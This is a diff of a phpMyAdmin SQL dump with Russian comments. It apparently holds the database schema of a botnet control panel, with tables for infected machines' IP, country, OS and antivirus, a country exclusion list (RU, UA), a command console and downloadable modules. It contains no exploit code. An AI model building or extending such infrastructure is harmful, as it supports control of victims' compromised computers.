@@ -1,14 +1,13 @@
 -- phpMyAdmin SQL Dump
--- version 4.9.0.1
+-- version 5.0.2
 -- https://www.phpmyadmin.net/
 --
 -- Хост: 127.0.0.1:3306
--- Время создания: Сен 16 2020 г., 21:58
--- Версия сервера: 10.1.38-MariaDB
--- Версия PHP: 7.1.32
+-- Время создания: Авг 01 2021 г., 01:37
+-- Версия сервера: 10.3.22-MariaDB
+-- Версия PHP: 7.1.33
 
 SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
-SET AUTOCOMMIT = 0;
 START TRANSACTION;
 SET time_zone = "+00:00";
 
@@ -34,9 +33,37 @@ CREATE TABLE `bots` (
   `checked` varchar(45) NOT NULL,
   `ip` longtext NOT NULL,
   `country` varchar(45) NOT NULL,
-  `OS` longtext,
-  `AV` longtext
+  `OS` longtext DEFAULT NULL,
+  `AV` longtext DEFAULT NULL
 ) ENGINE=MyISAM DEFAULT CHARSET=utf8mb4;
+
+-- --------------------------------------------------------
+
+--
+-- Структура таблицы `cis`
+--
+
+CREATE TABLE `cis` (
+  `black` longtext CHARACTER SET utf8 COLLATE utf8_bin NOT NULL
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
+
+--
+-- Дамп данных таблицы `cis`
+--
+
+INSERT INTO `cis` (`black`) VALUES
+('RU'),
+('UA');
+
+-- --------------------------------------------------------
+
+--
+-- Структура таблицы `console`
+--
+
+CREATE TABLE `console` (
+  `command` text COLLATE utf8mb4_unicode_ci NOT NULL
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
 
 -- --------------------------------------------------------
 
@@ -47,6 +74,17 @@ CREATE TABLE `bots` (
 CREATE TABLE `countries` (
   `country` longtext CHARACTER SET armscii8 NOT NULL,
   `value` int(11) NOT NULL
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
+
+-- --------------------------------------------------------
+
+--
+-- Структура таблицы `modules`
+--
+
+CREATE TABLE `modules` (
+  `name` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
+  `link` longtext COLLATE utf8mb4_unicode_ci NOT NULL
 ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
 
 -- --------------------------------------------------------
